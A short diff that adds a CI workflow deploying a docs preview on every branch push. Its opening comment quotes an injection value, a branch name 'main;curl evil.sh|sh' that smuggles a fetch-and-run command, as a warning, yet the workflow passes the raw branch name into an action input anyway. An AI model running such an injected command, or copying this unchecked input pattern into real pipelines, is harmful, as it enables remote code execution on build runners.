@@ -1,0 +1,13 @@
+# A branch named `main;curl evil.sh|sh` must never reach an action input:
+# some actions build shell commands from their inputs.
+version: 0
+workflows:
+  docs:
+    on: { push: { branches: ["**"] } }
+    jobs:
+      deploy-preview:
+        runner: ubuntu-24.04
+        steps:
+          - uses: some/preview-action@v2
+            with:
+              branch: { context: ref.name }
